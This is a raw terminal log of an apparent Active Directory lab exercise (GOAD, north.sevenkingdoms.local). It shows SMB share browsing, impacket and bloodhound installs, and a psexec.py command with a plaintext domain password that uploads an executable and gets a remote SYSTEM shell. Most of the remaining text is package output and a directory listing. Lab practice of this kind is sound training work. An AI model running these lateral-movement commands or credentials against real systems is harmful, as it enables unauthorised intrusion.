smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\> cd Windows NT\
cd \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Windows NT                          D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\> cd..
cd..: command not found
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\> cd..
cd..: command not found
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\> cd ..
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Microsoft                           D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> cd..
cd..: command not found
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> cd ..
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  GPT.INI                             A       22  Sun Apr 13 18:31:19 2025
  MACHINE                             D        0  Sun Apr 13 18:31:19 2025
  USER                                D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> cd USER
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER\> cd..
cd..: command not found
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER\> cd ..
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> cd ..
smb: \north.sevenkingdoms.local\Policies\> put test.txt
test.txt does not exist
smb: \north.sevenkingdoms.local\Policies\> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now

root@tala-HP-255-15-6-inch-G10-Notebook-PC:~/goatlab/recon# dir
goad_detailed_scan.gnmap  goad_detailed_scan.xml  script.ps1
goad_detailed_scan.nmap   GPT.INI		  secret.ps1
root@tala-HP-255-15-6-inch-G10-Notebook-PC:~/goatlab/recon# 


psexec.py 'north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_@192.168.20.22'




➜  ~ sudo apt update
sudo apt install python3 python3-pip python3-venv
[sudo] Passwort für tala: 
OK:1 http://security.ubuntu.com/ubuntu noble-security InRelease
OK:2 https://download.docker.com/linux/ubuntu noble InRelease                               
OK:3 https://repo.radeon.com/amdgpu/6.3.1/ubuntu jammy InRelease                            
OK:4 https://repo.protonvpn.com/debian stable InRelease                                     
OK:5 https://ppa.launchpadcontent.net/deadsnakes/ppa/ubuntu noble InRelease                 
OK:6 http://archive.ubuntu.com/ubuntu noble InRelease                     
OK:7 https://ppa.launchpadcontent.net/papirus/papirus/ubuntu noble InRelease
OK:8 https://repo.radeon.com/rocm/apt/6.3.1 jammy InRelease               
OK:9 http://archive.ubuntu.com/ubuntu noble-updates InRelease
OK:10 http://archive.ubuntu.com/ubuntu noble-backports InRelease
Paketlisten werden gelesen… Fertig
Abhängigkeitsbaum wird aufgebaut… Fertig
Statusinformationen werden eingelesen… Fertig
Aktualisierung für 2 Pakete verfügbar. Führen Sie »apt list --upgradable« aus, um sie anzuzeigen.
Paketlisten werden gelesen… Fertig
Abhängigkeitsbaum wird aufgebaut… Fertig
Statusinformationen werden eingelesen… Fertig
python3 ist schon die neueste Version (3.12.3-0ubuntu2).
python3-pip ist schon die neueste Version (24.0+dfsg-1ubuntu1.2).
python3-venv ist schon die neueste Version (3.12.3-0ubuntu2).
python3-venv wurde als manuell installiert festgelegt.
Die folgenden Pakete wurden automatisch installiert und werden nicht mehr benötigt:
  linux-headers-6.14.0-27-generic linux-hwe-6.14-headers-6.14.0-27
  linux-hwe-6.14-tools-6.14.0-27 linux-image-6.14.0-27-generic
  linux-modules-6.14.0-27-generic linux-modules-extra-6.14.0-27-generic
  linux-tools-6.14.0-27-generic
Verwenden Sie »sudo apt autoremove«, um sie zu entfernen.
0 aktualisiert, 0 neu installiert, 0 zu entfernen und 2 nicht aktualisiert.
➜  ~ python3 -m venv myenv
source myenv/bin/activate
Error: [Errno 13] Permission denied: '/home/tala/myenv/pyvenv.cfg'
(myenv) ➜  ~ pip install impacket
Requirement already satisfied: impacket in ./myenv/lib/python3.12/site-packages (0.12.0)
Requirement already satisfied: pyasn1>=0.2.3 in ./myenv/lib/python3.12/site-packages (from impacket) (0.6.1)
Requirement already satisfied: pyasn1_modules in ./myenv/lib/python3.12/site-packages (from impacket) (0.4.2)
Requirement already satisfied: pycryptodomex in ./myenv/lib/python3.12/site-packages (from impacket) (3.23.0)
Requirement already satisfied: pyOpenSSL==24.0.0 in ./myenv/lib/python3.12/site-packages (from impacket) (24.0.0)
Requirement already satisfied: six in ./myenv/lib/python3.12/site-packages (from impacket) (1.17.0)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in ./myenv/lib/python3.12/site-packages (from impacket) (2.9.1)
Requirement already satisfied: ldapdomaindump>=0.9.0 in ./myenv/lib/python3.12/site-packages (from impacket) (0.10.0)
Requirement already satisfied: flask>=1.0 in ./myenv/lib/python3.12/site-packages (from impacket) (3.1.2)
Requirement already satisfied: setuptools in ./myenv/lib/python3.12/site-packages (from impacket) (80.9.0)
Requirement already satisfied: charset_normalizer in ./myenv/lib/python3.12/site-packages (from impacket) (3.4.3)
Requirement already satisfied: cryptography<43,>=41.0.5 in ./myenv/lib/python3.12/site-packages (from pyOpenSSL==24.0.0->impacket) (42.0.8)
Requirement already satisfied: blinker>=1.9.0 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket) (1.9.0)
Requirement already satisfied: click>=8.1.3 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket) (8.2.1)
Requirement already satisfied: itsdangerous>=2.2.0 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket) (2.2.0)
Requirement already satisfied: jinja2>=3.1.2 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket) (3.1.6)
Requirement already satisfied: markupsafe>=2.1.1 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket) (3.0.2)
Requirement already satisfied: werkzeug>=3.1.0 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket) (3.1.3)
Requirement already satisfied: dnspython in ./myenv/lib/python3.12/site-packages (from ldapdomaindump>=0.9.0->impacket) (2.7.0)
Requirement already satisfied: cffi>=1.12 in ./myenv/lib/python3.12/site-packages (from cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket) (1.17.1)
Requirement already satisfied: pycparser in ./myenv/lib/python3.12/site-packages (from cffi>=1.12->cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket) (2.22)
(myenv) ➜  ~ pip install bloodhound
Collecting bloodhound
  Downloading bloodhound-1.8.0-py3-none-any.whl.metadata (973 bytes)
Requirement already satisfied: dnspython in ./myenv/lib/python3.12/site-packages (from bloodhound) (2.7.0)
Requirement already satisfied: impacket>=0.9.17 in ./myenv/lib/python3.12/site-packages (from bloodhound) (0.12.0)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in ./myenv/lib/python3.12/site-packages (from bloodhound) (2.9.1)
Requirement already satisfied: pyasn1>=0.4 in ./myenv/lib/python3.12/site-packages (from bloodhound) (0.6.1)
Collecting pycryptodome (from bloodhound)
  Using cached pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Requirement already satisfied: pyasn1_modules in ./myenv/lib/python3.12/site-packages (from impacket>=0.9.17->bloodhound) (0.4.2)
Requirement already satisfied: pycryptodomex in ./myenv/lib/python3.12/site-packages (from impacket>=0.9.17->bloodhound) (3.23.0)
Requirement already satisfied: pyOpenSSL==24.0.0 in ./myenv/lib/python3.12/site-packages (from impacket>=0.9.17->bloodhound) (24.0.0)
Requirement already satisfied: six in ./myenv/lib/python3.12/site-packages (from impacket>=0.9.17->bloodhound) (1.17.0)
Requirement already satisfied: ldapdomaindump>=0.9.0 in ./myenv/lib/python3.12/site-packages (from impacket>=0.9.17->bloodhound) (0.10.0)
Requirement already satisfied: flask>=1.0 in ./myenv/lib/python3.12/site-packages (from impacket>=0.9.17->bloodhound) (3.1.2)
Requirement already satisfied: setuptools in ./myenv/lib/python3.12/site-packages (from impacket>=0.9.17->bloodhound) (80.9.0)
Requirement already satisfied: charset_normalizer in ./myenv/lib/python3.12/site-packages (from impacket>=0.9.17->bloodhound) (3.4.3)
Requirement already satisfied: cryptography<43,>=41.0.5 in ./myenv/lib/python3.12/site-packages (from pyOpenSSL==24.0.0->impacket>=0.9.17->bloodhound) (42.0.8)
Requirement already satisfied: blinker>=1.9.0 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket>=0.9.17->bloodhound) (1.9.0)
Requirement already satisfied: click>=8.1.3 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket>=0.9.17->bloodhound) (8.2.1)
Requirement already satisfied: itsdangerous>=2.2.0 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket>=0.9.17->bloodhound) (2.2.0)
Requirement already satisfied: jinja2>=3.1.2 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket>=0.9.17->bloodhound) (3.1.6)
Requirement already satisfied: markupsafe>=2.1.1 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket>=0.9.17->bloodhound) (3.0.2)
Requirement already satisfied: werkzeug>=3.1.0 in ./myenv/lib/python3.12/site-packages (from flask>=1.0->impacket>=0.9.17->bloodhound) (3.1.3)
Requirement already satisfied: cffi>=1.12 in ./myenv/lib/python3.12/site-packages (from cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket>=0.9.17->bloodhound) (1.17.1)
Requirement already satisfied: pycparser in ./myenv/lib/python3.12/site-packages (from cffi>=1.12->cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket>=0.9.17->bloodhound) (2.22)
Downloading bloodhound-1.8.0-py3-none-any.whl (84 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 84.3/84.3 kB 3.2 MB/s eta 0:00:00
Using cached pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Installing collected packages: pycryptodome, bloodhound
ERROR: Could not install packages due to an OSError: [Errno 13] Keine Berechtigung: '/home/tala/myenv/lib/python3.12/site-packages/pycryptodome-3.23.0.dist-info'
Check the permissions.

(myenv) ➜  ~ sudo su
root@tala-HP-255-15-6-inch-G10-Notebook-PC:/home/tala# pip install bloodhound
error: externally-managed-environment

× This environment is externally managed
╰─> To install Python packages system-wide, try apt install
    python3-xyz, where xyz is the package you are trying to
    install.
    
    If you wish to install a non-Debian-packaged Python package,
    create a virtual environment using python3 -m venv path/to/venv.
    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
    sure you have python3-full installed.
    
    If you wish to install a non-Debian packaged Python application,
    it may be easiest to use pipx install xyz, which will manage a
    virtual environment for you. Make sure you have pipx installed.
    
    See /usr/share/doc/python3.12/README.venv for more information.

note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
hint: See PEP 668 for the detailed specification.
root@tala-HP-255-15-6-inch-G10-Notebook-PC:/home/tala# python3 -m impacket.secretsdump <Argumente>
python3 -m bloodhound.ad <Argumente>
bash: Syntaxfehler beim unerwarteten Wort »newline«
bash: Syntaxfehler beim unerwarteten Wort »newline«
root@tala-HP-255-15-6-inch-G10-Notebook-PC:/home/tala# rm -rf myenv
root@tala-HP-255-15-6-inch-G10-Notebook-PC:/home/tala# python3 -m venv myenv
root@tala-HP-255-15-6-inch-G10-Notebook-PC:/home/tala# source myenv/bin/activate
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:/home/tala# pip install impacket bloodhound
Collecting impacket
  Using cached impacket-0.12.0-py3-none-any.whl
Collecting bloodhound
  Downloading bloodhound-1.8.0-py3-none-any.whl.metadata (973 bytes)
Collecting pyasn1>=0.2.3 (from impacket)
  Using cached pyasn1-0.6.1-py3-none-any.whl.metadata (8.4 kB)
Collecting pyasn1_modules (from impacket)
  Using cached pyasn1_modules-0.4.2-py3-none-any.whl.metadata (3.5 kB)
Collecting pycryptodomex (from impacket)
  Using cached pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Collecting pyOpenSSL==24.0.0 (from impacket)
  Using cached pyOpenSSL-24.0.0-py3-none-any.whl.metadata (12 kB)
Collecting six (from impacket)
  Using cached six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 (from impacket)
  Using cached ldap3-2.9.1-py2.py3-none-any.whl.metadata (5.4 kB)
Collecting ldapdomaindump>=0.9.0 (from impacket)
  Using cached ldapdomaindump-0.10.0-py3-none-any.whl.metadata (512 bytes)
Collecting flask>=1.0 (from impacket)
  Using cached flask-3.1.2-py3-none-any.whl.metadata (3.2 kB)
Collecting setuptools (from impacket)
  Using cached setuptools-80.9.0-py3-none-any.whl.metadata (6.6 kB)
Collecting charset_normalizer (from impacket)
  Using cached charset_normalizer-3.4.3-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (36 kB)
Collecting cryptography<43,>=41.0.5 (from pyOpenSSL==24.0.0->impacket)
  Using cached cryptography-42.0.8-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (5.3 kB)
Collecting dnspython (from bloodhound)
  Using cached dnspython-2.7.0-py3-none-any.whl.metadata (5.8 kB)
Collecting pycryptodome (from bloodhound)
  Using cached pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Collecting blinker>=1.9.0 (from flask>=1.0->impacket)
  Using cached blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)
Collecting click>=8.1.3 (from flask>=1.0->impacket)
  Using cached click-8.2.1-py3-none-any.whl.metadata (2.5 kB)
Collecting itsdangerous>=2.2.0 (from flask>=1.0->impacket)
  Using cached itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
Collecting jinja2>=3.1.2 (from flask>=1.0->impacket)
  Using cached jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
Collecting markupsafe>=2.1.1 (from flask>=1.0->impacket)
  Using cached MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.0 kB)
Collecting werkzeug>=3.1.0 (from flask>=1.0->impacket)
  Using cached werkzeug-3.1.3-py3-none-any.whl.metadata (3.7 kB)
Collecting cffi>=1.12 (from cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket)
  Using cached cffi-1.17.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.5 kB)
Collecting pycparser (from cffi>=1.12->cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket)
  Using cached pycparser-2.22-py3-none-any.whl.metadata (943 bytes)
Using cached pyOpenSSL-24.0.0-py3-none-any.whl (58 kB)
Downloading bloodhound-1.8.0-py3-none-any.whl (84 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 84.3/84.3 kB 3.1 MB/s eta 0:00:00
Using cached flask-3.1.2-py3-none-any.whl (103 kB)
Using cached ldap3-2.9.1-py2.py3-none-any.whl (432 kB)
Using cached ldapdomaindump-0.10.0-py3-none-any.whl (19 kB)
Using cached pyasn1-0.6.1-py3-none-any.whl (83 kB)
Using cached charset_normalizer-3.4.3-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (151 kB)
Using cached dnspython-2.7.0-py3-none-any.whl (313 kB)
Using cached pyasn1_modules-0.4.2-py3-none-any.whl (181 kB)
Using cached pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Using cached pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Using cached setuptools-80.9.0-py3-none-any.whl (1.2 MB)
Using cached six-1.17.0-py2.py3-none-any.whl (11 kB)
Using cached blinker-1.9.0-py3-none-any.whl (8.5 kB)
Using cached click-8.2.1-py3-none-any.whl (102 kB)
Using cached cryptography-42.0.8-cp39-abi3-manylinux_2_28_x86_64.whl (3.9 MB)
Using cached itsdangerous-2.2.0-py3-none-any.whl (16 kB)
Using cached jinja2-3.1.6-py3-none-any.whl (134 kB)
Using cached MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (23 kB)
Using cached werkzeug-3.1.3-py3-none-any.whl (224 kB)
Using cached cffi-1.17.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (479 kB)
Using cached pycparser-2.22-py3-none-any.whl (117 kB)
Installing collected packages: six, setuptools, pycryptodomex, pycryptodome, pycparser, pyasn1, markupsafe, itsdangerous, dnspython, click, charset_normalizer, blinker, werkzeug, pyasn1_modules, ldap3, jinja2, cffi, ldapdomaindump, flask, cryptography, pyOpenSSL, impacket, bloodhound
Successfully installed blinker-1.9.0 bloodhound-1.8.0 cffi-1.17.1 charset_normalizer-3.4.3 click-8.2.1 cryptography-42.0.8 dnspython-2.7.0 flask-3.1.2 impacket-0.12.0 itsdangerous-2.2.0 jinja2-3.1.6 ldap3-2.9.1 ldapdomaindump-0.10.0 markupsafe-3.0.2 pyOpenSSL-24.0.0 pyasn1-0.6.1 pyasn1_modules-0.4.2 pycparser-2.22 pycryptodome-3.23.0 pycryptodomex-3.23.0 setuptools-80.9.0 six-1.17.0 werkzeug-3.1.3
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:/home/tala# impacket-mssqlclient -windows-auth north.sevenkingdoms.local/sql_svc:cracked_password@192.168.20.22
impacket-mssqlclient: Befehl nicht gefunden.
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:/home/tala# sudo apt update
OK:1 http://archive.ubuntu.com/ubuntu noble InRelease
Holen:2 http://archive.ubuntu.com/ubuntu noble-updates InRelease [126 kB]                   
OK:3 https://download.docker.com/linux/ubuntu noble InRelease                               
OK:4 https://repo.radeon.com/amdgpu/6.3.1/ubuntu jammy InRelease                            
OK:5 https://repo.protonvpn.com/debian stable InRelease                                     
OK:6 https://ppa.launchpadcontent.net/deadsnakes/ppa/ubuntu noble InRelease                 
OK:7 http://archive.ubuntu.com/ubuntu noble-backports InRelease                             
OK:8 https://ppa.launchpadcontent.net/papirus/papirus/ubuntu noble InRelease                
OK:9 http://security.ubuntu.com/ubuntu noble-security InRelease                             
OK:10 https://repo.radeon.com/rocm/apt/6.3.1 jammy InRelease
Es wurden 126 kB in 1 s geholt (197 kB/s).
Paketlisten werden gelesen… Fertig
Abhängigkeitsbaum wird aufgebaut… Fertig
Statusinformationen werden eingelesen… Fertig
Aktualisierung für 2 Pakete verfügbar. Führen Sie »apt list --upgradable« aus, um sie anzuzeigen.
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:/home/tala# sudo apt upgrade
Paketlisten werden gelesen… Fertig
Abhängigkeitsbaum wird aufgebaut… Fertig
Statusinformationen werden eingelesen… Fertig
Paketaktualisierung (Upgrade) wird berechnet… Fertig
Die folgenden Pakete wurden automatisch installiert und werden nicht mehr benötigt:
  linux-headers-6.14.0-27-generic linux-hwe-6.14-headers-6.14.0-27
  linux-hwe-6.14-tools-6.14.0-27 linux-image-6.14.0-27-generic
  linux-modules-6.14.0-27-generic linux-modules-extra-6.14.0-27-generic
  linux-tools-6.14.0-27-generic
Verwenden Sie »sudo apt autoremove«, um sie zu entfernen.
Get more security updates through Ubuntu Pro with 'esm-apps' enabled:
  vlc-plugin-qt libvlc5 syncthing libdcmtk17t64 libzvbi-common liburiparser1
  vlc-data libvlccore9 vlc vlc-bin libwinpr2-2t64 vlc-l10n libcjson1
  libavdevice60 libbson-1.0-0t64 libpostproc57 python3-aiohttp
  jupyter-notebook vlc-plugin-samba libmongoc-1.0-0t64 libavcodec60
  libgstreamer-plugins-bad1.0-0 libzvbi0t64 gobuster vlc-plugin-notify
  libavutil58 libswscale7 vlc-plugin-access-extra vlc-plugin-skins2
  vlc-plugin-video-splitter libswresample4 fig2dev vlc-plugin-video-output
  python3-notebook libbotan-2-19 7zip libavformat60 libfreerdp2-2t64
  libgraphicsmagick-q16-3t64 libvlc-bin vlc-plugin-base
  vlc-plugin-visualization libavfilter9
Learn more about Ubuntu Pro at https://ubuntu.com/pro
Die folgenden Aktualisierungen sind wegen Phasenstufung zurückgestellt worden:
  xserver-xorg-video-nouveau
Die folgenden Pakete werden aktualisiert (Upgrade):
  xserver-xorg-video-vesa
1 aktualisiert, 0 neu installiert, 0 zu entfernen und 1 nicht aktualisiert.
Es müssen 15,5 kB an Archiven heruntergeladen werden.
Nach dieser Operation werden 0 B Plattenplatz zusätzlich benutzt.
Möchten Sie fortfahren? [J/n] j
Holen:1 http://archive.ubuntu.com/ubuntu noble-updates/main amd64 xserver-xorg-video-vesa amd64 1:2.6.0-1ubuntu0.1 [15,5 kB]
Es wurden 15,5 kB in 0 s geholt (134 kB/s).        
(Lese Datenbank ... 485522 Dateien und Verzeichnisse sind derzeit installiert.)
Vorbereitung zum Entpacken von .../xserver-xorg-video-vesa_1%3a2.6.0-1ubuntu0.1_amd64.deb ...
Entpacken von xserver-xorg-video-vesa (1:2.6.0-1ubuntu0.1) über (1:2.6.0-1) ...
xserver-xorg-video-vesa (1:2.6.0-1ubuntu0.1) wird eingerichtet ...
Trigger für man-db (2.12.0-4build2) werden verarbeitet ...
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:/home/tala# psexec.py 'north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_@192.168.20.22'
/home/tala/myenv/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.20.22.....
[*] Found writable share ADMIN$
[*] Uploading file Zalxttmj.exe
[*] Opening SVCManager on 192.168.20.22.....
[*] Creating service RcpJ on 192.168.20.22.....
[*] Starting service RcpJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> dir
 Volume in drive C is Windows 2019
 Volume Serial Number is A87E-BFF5

 Directory of C:\Windows\system32

04/13/2025  07:11 PM    <DIR>          .
04/13/2025  07:11 PM    <DIR>          ..
09/15/2018  11:06 AM    <DIR>          0409
04/13/2025  07:10 PM    <DIR>          1033
09/15/2018  09:12 AM             2,151 12520437.cpx
09/15/2018  09:12 AM             2,233 12520850.cpx
09/15/2018  09:13 AM               232 @AppHelpToast.png
09/15/2018  09:13 AM               308 @AudioToastIcon.png
09/15/2018  09:13 AM               330 @EnrollmentToastIcon.png
09/15/2018  09:13 AM               404 @VpnToastIcon.png
09/15/2018  09:13 AM               691 @WirelessDisplayToast.png
09/15/2018  09:13 AM           129,024 aadauthhelper.dll
09/07/2019  02:20 AM         1,476,096 aadtb.dll
09/15/2018  09:13 AM           115,512 aadWamExtension.dll
09/07/2019  02:20 AM           329,728 AboveLockAppHost.dll
09/15/2018  09:13 AM         3,802,624 accessibilitycpl.dll
09/07/2019  02:20 AM         2,393,088 AcGenral.dll
09/07/2019  02:20 AM           394,752 AcLayers.dll
09/15/2018  09:13 AM             8,704 acledit.dll
09/15/2018  09:12 AM         5,384,704 aclui.dll
09/15/2018  09:13 AM            69,120 acppage.dll
09/15/2018  09:13 AM           460,800 AcSpecfc.dll
09/15/2018  09:13 AM           259,584 ActionCenter.dll
09/15/2018  09:13 AM           536,576 ActionCenterCPL.dll
09/15/2018  09:13 AM            43,520 ActivationClient.dll
09/07/2019  02:20 AM           589,312 ActivationManager.dll
09/15/2018  09:12 AM           219,648 activeds.dll
09/15/2018  09:12 AM           112,128 activeds.tlb
09/15/2018  09:11 AM           271,360 actxprxy.dll
09/15/2018  09:13 AM            32,256 AcWinRT.dll
09/15/2018  09:11 AM            37,888 acwow64.dll
09/15/2018  09:13 AM            87,040 AcXtrnal.dll
02/01/2023  02:19 AM         1,449,904 adal.dll
09/15/2018  09:13 AM           902,144 AdaptiveCards.dll
09/15/2018  09:13 AM            53,248 AddressParser.dll
09/15/2018  09:13 AM           429,056 AdmTmpl.dll
04/13/2025  06:54 PM            48,640 admwprox.dll
09/15/2018  09:13 AM            49,152 adprovider.dll
09/15/2018  11:08 AM            99,840 adrclient.dll
09/15/2018  09:12 AM           199,680 adsldp.dll
09/15/2018  09:12 AM           208,896 adsldpc.dll
09/15/2018  09:12 AM            84,992 adsmsext.dll
09/15/2018  09:12 AM           288,256 adsnt.dll
09/15/2018  09:11 AM             2,560 adtschema.dll
09/15/2018  09:19 AM    <DIR>          AdvancedInstallers
09/15/2018  09:11 AM           507,400 advapi32.dll
09/15/2018  09:11 AM             2,560 advapi32res.dll
09/15/2018  09:12 AM           120,832 advpack.dll
09/15/2018  09:13 AM            30,720 aeevts.dll
09/07/2019  02:20 AM           415,544 aepic.dll
04/13/2025  06:54 PM            26,112 ahadmin.dll
09/15/2018  09:13 AM           163,328 altspace.dll
09/15/2018  11:06 AM            18,944 amcompat.tlb
09/15/2018  09:13 AM            50,688 amsi.dll
09/15/2018  09:13 AM            77,312 amstream.dll
09/15/2018  09:13 AM           209,920 apds.dll
09/15/2018  09:13 AM            64,512 ApiSetHost.AppExecutionAlias.dll
09/07/2019  02:21 AM         1,004,032 APMon.dll
09/15/2018  09:13 AM           721,920 AppContracts.dll
09/15/2018  09:13 AM           133,120 AppExtension.dll
09/07/2019  02:20 AM           624,640 apphelp.dll
09/15/2018  09:13 AM            29,696 Apphlpdm.dll
09/15/2018  09:13 AM            52,864 appidapi.dll
09/15/2018  09:13 AM           294,912 AppIdPolicyEngineApi.dll
09/15/2018  09:13 AM            20,992 appidtel.exe
09/15/2018  09:19 AM    <DIR>          AppLocker
09/15/2018  09:13 AM           276,480 AppLockerCSP.dll
09/15/2018  11:08 AM           129,024 AppManagementConfiguration.dll
09/15/2018  09:13 AM           160,768 appmgmts.dll
09/15/2018  09:13 AM           370,688 appmgr.dll
09/15/2018  09:13 AM           114,688 AppointmentActivation.dll
09/15/2018  09:13 AM           679,424 AppointmentApis.dll
09/15/2018  09:13 AM            10,240 apprepapi.dll
09/07/2019  02:20 AM           449,376 AppResolver.dll
09/15/2018  11:08 AM            27,152 AppVClientPS.dll
09/07/2019  02:20 AM         1,522,704 AppVEntSubsystems32.dll
09/15/2018  11:08 AM            13,624 AppVSentinel.dll
09/15/2018  11:08 AM            17,928 AppVTerminator.dll
09/15/2018  09:13 AM           858,112 appwiz.cpl
09/07/2019  02:20 AM           273,920 AppxAllUserStore.dll
09/15/2018  09:13 AM           191,488 AppxApplicabilityEngine.dll
09/07/2019  02:20 AM           652,832 AppXDeploymentClient.dll
09/07/2019  02:20 AM         1,477,432 AppxPackaging.dll
09/15/2018  09:13 AM             3,022 AppxProvisioning.xml
09/15/2018  09:13 AM           231,936 AppxSip.dll
09/15/2018  11:06 AM    <DIR>          ar-SA
09/15/2018  09:13 AM           533,504 archiveint.dll
09/15/2018  09:12 AM            22,528 ARP.EXE
09/15/2018  09:12 AM             2,560 asferror.dll
09/15/2018  09:14 AM            29,344 aspnet_counters.dll
04/13/2025  06:56 PM            25,088 aspperf.dll
09/07/2019  02:20 AM            47,104 AssignedAccessRuntime.dll
09/15/2018  09:11 AM            75,264 asycfilt.dll
09/15/2018  09:12 AM            25,088 at.exe
09/15/2018  09:13 AM            60,928 AtBroker.exe
09/15/2018  09:12 AM            80,896 atl.dll
09/15/2018  09:13 AM            37,376 atlthunk.dll
09/15/2018  09:12 AM            38,912 atmlib.dll
09/15/2018  09:11 AM            19,456 attrib.exe
09/15/2018  09:12 AM           243,200 audiodev.dll
09/07/2019  02:20 AM         1,899,152 AudioEng.dll
09/15/2018  09:13 AM           387,600 AUDIOKSE.dll
09/07/2019  02:20 AM         1,098,136 AudioSes.dll
